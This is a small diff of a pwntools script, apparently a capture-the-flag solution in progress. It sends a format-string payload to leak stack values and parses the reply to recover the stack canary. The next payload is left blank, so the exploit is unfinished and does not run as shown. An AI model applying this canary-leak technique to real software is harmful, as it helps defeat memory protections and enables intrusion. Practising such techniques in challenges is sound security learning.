@@ -8,7 +8,10 @@ payload=b'%17$paaa%19$p'
 
 p.sendlineafter("Hi! What's your name? ",payload)
 
-buf=p.recvuntil('!')
+buf=p.recvuntil('!').decode()
+tmp=buf.split(" ")[4].split("aaa")[0]
+canary=int(tmp,16)
+# base=132F+
 payload=
 
 p.interactive()
